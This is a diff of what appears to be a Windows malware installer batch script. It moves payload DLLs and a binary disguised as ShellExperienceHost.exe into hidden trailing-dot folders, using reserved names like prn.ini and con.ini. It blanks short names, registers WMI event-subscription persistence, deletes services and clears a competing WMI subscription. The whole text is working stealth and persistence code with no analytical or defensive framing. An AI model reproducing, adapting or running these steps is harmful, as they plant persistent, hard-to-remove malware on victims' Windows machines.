@@ -9,17 +9,17 @@ mkdir \\.\%ProgramData%\logdata..\
 mkdir \\.\%ProgramData%\diaglogs..\
 mkdir %WINDIR%\Setup\Scripts
 
-copy /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe" "\\.\%ProgramData%\logdata..\"
-move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\IconLib.dll" "\\.\%ProgramData%\logdata..\prn.ini"
+copy /Y "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\Index.exe" "\\.\%ProgramData%\logdata..\"
+move /Y "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\IconLib.dll" "\\.\%ProgramData%\logdata..\prn.ini"
 
-move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe" "\\.\%ProgramData%\diaglogs..\"
-move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Kape.dll" "\\.\%ProgramData%\diaglogs..\con.ini"
+move /Y "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\Index.exe" "\\.\%ProgramData%\diaglogs..\"
+move /Y "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\Kape.dll" "\\.\%ProgramData%\diaglogs..\con.ini"
 
-move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\libssl-1_1.dll" "\\.\%ProgramData%\config..\"
-move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\vcruntime140.dll" "\\.\%ProgramData%\config..\"
-move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\libcrypto-1_1.dll" "\\.\%ProgramData%\config..\"
-move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\ShellExperienceHost.exe" "\\.\%ProgramData%\config..\"
-rd /s /q "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
+move /Y "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\libssl-1_1.dll" "\\.\%ProgramData%\config..\"
+move /Y "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\vcruntime140.dll" "\\.\%ProgramData%\config..\"
+move /Y "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\libcrypto-1_1.dll" "\\.\%ProgramData%\config..\"
+move /Y "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\ShellExperienceHost.exe" "\\.\%ProgramData%\config..\"
+rd /s /q "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}"
 
 fsutil file setshortname C:\ProgramData\config..\ ""
 fsutil file setshortname C:\ProgramData\logdata..\ ""
@@ -62,7 +62,6 @@ powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription
 powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter='__EventFilter.Name=\"MCS\"'; Consumer='CommandLineEventConsumer.Name=\"MCS\"'} | Out-Null"
 
 sc start Performance
-
 sc delete Help
 wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="CSM" DELETE & wmic/namespace:\\root\subscription PATH __EventFilter WHERE Name="CSM" DELETE & wmic/namespace:\\root\subscription PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="CSM"' DELETE
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like '*CSM*' -or $_.Consumer -like '*SCM*' } | Remove-WmiObject"
